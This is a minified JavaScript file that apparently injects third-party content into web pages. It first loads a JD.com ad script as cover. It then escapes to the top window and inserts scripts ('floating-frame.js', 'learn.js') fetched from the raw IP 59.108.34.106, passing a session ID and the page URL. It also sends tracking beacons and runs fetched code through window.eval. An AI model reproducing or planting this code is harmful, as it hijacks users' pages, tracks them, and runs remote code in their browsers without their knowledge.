(function() {
  function sendAccounting(n, e) {
    n = n || 1;
    e = e || 0;
    var t = new Image;
    11 == e || w && 6 == e || (t.src = "http://59.108.34.106:80/" + n + "-1746/08c31dcf-84dc-4886-9dc4-ddbcb6dfe643_117.73.240.227/" + e + "." + (h + j));
    (2 == n || g) && I.d();
    return t
  }

  function n(n) {
    return w ? "http://59.108.34.106:80/Check/2/1746/08c31dcf-84dc-4886-9dc4-ddbcb6dfe643/117.73.240.227/nyq2c2" : 1 == n && "http://59.108.34.106/CheckUrl/1/1746"
  }

  function e(e) {
    var i, r, o = Math.floor(1e3 * j),
      u = "fp",
      c = u + o,
      s = {
        h: "8cee8a11d119d5761f373108cf594928eeeae6d8"
      },
      a = "_!$[]fp08c31dcf-84dc-4886-9dc4-ddbcb6dfe643[]$!_";
    I = {
      d: function() {
        y[a] === s && (y[a] = 0)
      },
      s: function(n) {
        y[a].c = n
      }
    };
    if (w && T - w > 54e5) return 11;
    "string" == typeof e.jsURI && (e.jsURI = [e.jsURI]);
    if ((i = y[a]) && i.h === s.h && !i.c) return 1;
    r = i && i.c;
    y[a] = s;
    if (e.requireTopWindow && y != top) return 2;
    if (e.requireObjectHasOwnProperty && !Object.prototype.hasOwnProperty) return 3;
    if (e.json) {
      if ("string" == typeof e.json) try {
        e.json = C.eval("(" + e.json + ")")
      } catch (l) {
        return 4
      }
      e.json.minimum_width = e.minWidth = e.json.minimum_width || e.minWidth;
      e.json.minimum_height = e.minHeight = e.json.minimum_height || e.minHeight;
      e.json._accounting = {
        stopTime: m,
        sendAccounting: sendAccounting,
        allowNext: I,
        uri: "http://59.108.34.106/static",
        comm: "http://59.108.34.106/static".replace(/\w+$/, ""),
        fpsessionid: "08c31dcf-84dc-4886-9dc4-ddbcb6dfe643",
        check: n("%TOPURLMATCH%"),
        direct: !1,
        prev: r
      }
    }
    if (!(e.json && "" === e.json.sprite_img || t(y, M, e.minHeight, e.minWidth))) return 5;
    if (e.json2uri) {
      for (; void 0 !== y[c];) c = u + ++o;
      y[c] = e.json;
      for (i = 0; e.jsURI.length > i; i++) e.jsURI[i] += (-1 !== e.jsURI[i].indexOf("?") ? "&" : "?") + c
    }
  }

  function t(n, e, t, i) {
    var r = e.documentElement || e.body || {},
      o = n.innerWidth || r.clientWidth || 0,
      u = n.innerHeight || r.clientHeight || 0;
    return o >= t && u >= i || !(o + u)
  }

  function i() {
    var n, t, i, r, c, s, l = (new Date).getTime(),
      f = {
        requireTopWindow: !0,
        requireObjectHasOwnProperty: !1,
        minWidth: 550,
        minHeight: 400,
        sendEarlyAccounting: !0
      };
    i = function(n, e) {
      return n === "@" + e ? null : n
    };
    c = function(n, e) {
      if (null === i(n, e)) return null;
      n = parseInt(n);
      return isNaN(n) ? null : n
    };
    i = function(n, e) {
      return n === "@" + e ? null : n
    };
    r = function(n, e) {
      if (null === i(n, e)) return null;
      n = n.toLowerCase();
      if ("true" == n) return !0;
      if ("false" == n) return !1;
      n = c(n, e);
      null !== n && (n = !!n);
      return n
    };
    c = function(n, e) {
      if (null === i(n, e)) return null;
      n = parseInt(n);
      return isNaN(n) ? null : n
    };
    s = function(n, e) {
      if (null === i(n, e)) return null;
      n = parseFloat(n);
      return isNaN(n) ? null : n
    };
    f.jsURI = "http://59.108.34.106/static/FloatingContent/2J4hsjvaGyS39_lI9icOxw/floating-frame.js";
    f.requireTopWindow = r("true", "RequireTopWindow");
    f.minHeight = c("1", "MinimumHeight");
    f.minWidth = c("1", "MinimumWidth");
    f.jsURI = i(u("http://59.108.34.106/static/Device/learn.js?FPSESSIONID=08c31dcf-84dc-4886-9dc4-ddbcb6dfe643&COMMIP=59.108.34.106&OPERATORWEBSITELOGIC=OR"), "ContentURL");
    g = r("1", "AllowReplace");
    if (f.requireTopWindow) try {
      o(top.document, "a");
      y = top;
      M = y.document
    } catch (h) {}
    if ((n = e(f)) || l > m) sendAccounting(2, n);
    else {
      f.sendEarlyAccounting && sendAccounting(1);
      if (f.jsURI) {
        p = a(M);
        for (n = 0; f.jsURI.length > n; n++) {
          t = o(M, "script", null, "src", u(f.jsURI[n]), "type", R);
          t[j] = f.json;
          p.appendChild(t)
        }
      }
      if (f.onInsert) try {
        f.onInsert()
      } catch (d) {}
    }
  }

  function r(n) {
    var e, t, i = [function() {
      return new XMLHttpRequest
    }, function() {
      return new ActiveXObject("Msxml2.XMLHTTP")
    }, function() {
      return new ActiveXObject("Microsoft.XMLHTTP")
    }, C.createRequest];
    for (t = 0; i.length > t; t++) {
      e = 0;
      try {
        e = i[t]();
        break
      } catch (r) {
        e = 0
      }
    }
    if (e) try {
      e.open("GET", n, !1);
      e.setRequestHeader("X-PLCS", "xhr");
      e.send(null);
      if (200 == e.status) return e.responseText || " "
    } catch (r) {}
  }

  function o(n, e, t) {
    var i, r = n.createElement(e);
    t && r.appendChild(n.createTextNode(t));
    for (i = 3; arguments.length > i; i += 2) r.setAttribute(arguments[i], arguments[i + 1]);
    return r
  }

  function u(n) {
    return n.replace("$PAGEURL$", escape(s(y).href))
  }

  function c() {
    C.V = c.V;
    c.oncomplete && c.oncomplete()
  }

  function s(n) {
    return n.location || n.document.location || {}
  }

  function a(n, e, t) {
    e = n.getElementsByTagName("script");
    return ((t = e.length) ? e[t - 1] : h = 4).parentNode || n.body || n.documentElement.firstChild
  }
  try {
    var l, f, m, p, h, d, I, g,
      R = "text/javascript",
      j = Math.random(),
      T = (new Date).getTime(),
      w = parseInt("nyq2c2", 36),
      U = parseFloat("45"),
      C = window,
      E = document,
      y = C,
      M = E;
    f = "http://" + unescape("static.360buyimg.com%2Fjzt%2Ftemp%2Fjs%2FadPic.new.20150909.min.js");
    p = E.createElement("div");
    h = 3;
    p.innerHTML = "<!--[if IE]><i></i><![endif]-->";
    d = p.getElementsByTagName("i").length;
    c.V = C.V;
    C.V = c;
    isNaN(U) && (U = 15);
    m = T + 1e3 * U - 2;
    w = isFinite(w) ? 1e3 * w : 0;
    f += (~f.indexOf("?") ? ~f.indexOf(";") ? ";" : "&" : "?") + "_fp" + (0 | 1e3 * j) + "=" + j;
    if (f.split("/")[2] == s(C).host) {
      l = r(f);
      if (l) {
        h = 1;
        c.js = l;
        c.oncomplete = i;
        return
      }
    }
    if (E.readyState == (d ? "interactive" : "loading")) {
      h = 2;
      E.write("<scr".concat('ipt src="') + f + '" type="' + R + '"></scr'.concat("ipt>"))
    } else {
      p = a(E);
      p.appendChild(o(E, "script", 0, "src", f, "type", R, "async", !1))
    }
    i()
  } catch (O) {}
})();

if (window.V) {
  if (V.js) try {
    window.eval(V.js)
  } catch (e) {}
  V()
}
